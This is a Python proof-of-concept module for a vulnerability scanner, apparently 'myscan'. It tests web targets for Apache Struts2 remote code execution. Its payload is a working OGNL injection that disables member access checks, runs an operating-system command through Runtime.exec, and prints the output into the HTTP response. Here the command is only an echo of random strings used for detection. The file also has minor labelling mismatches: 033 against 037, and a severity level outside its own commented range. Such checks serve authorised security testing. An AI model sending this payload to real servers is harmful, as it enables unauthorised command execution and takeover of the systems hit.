#!/usr/bin/env python3
# @Time    : 2020-04-09
# @Author  : caicai
# @File    : poc_struts2_033.py


import copy
from myscan.lib.helper.request import request
from myscan.lib.core.common import get_random_str, check_echo
from myscan.lib.parse.response_parser import response_parser


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "Struts2-037"
        self.vulmsg = "Struts2-037远程代码执行"
        self.level = 3  # 0:Low  1:Medium 2:High

    def verify(self):
        # 添加限定条件
        if self.dictdata.get("url").get("extension").lower() not in ["do", "action", ""]:
            return
        headers = copy.deepcopy(self.dictdata.get("request").get("headers"))
        rs1 = get_random_str(4)
        rs2 = get_random_str(4)
        random_str = "{} {}".format(rs1, rs2)
        payloads = [
            r"%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=echo%20" + random_str,
        ]
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        for payload in payloads:
            req = {
                "url": self.url + payload,
                "method": "GET",
                "headers": headers,
            }
            r = request(**req)
            if r != None:
                if check_echo(r.content, rs1, rs2):
                    self.save(r)
                    return

    def save(self, r):
        parser_ = response_parser(r)
        self.result.append({
            "name": self.name,
            "url": self.url,
            "level": self.level,  # 0:Low  1:Medium 2:High
            "detail": {
                "vulmsg": self.vulmsg,
                "request": parser_.getrequestraw(),
                "response": parser_.getresponseraw(),
            }
        })
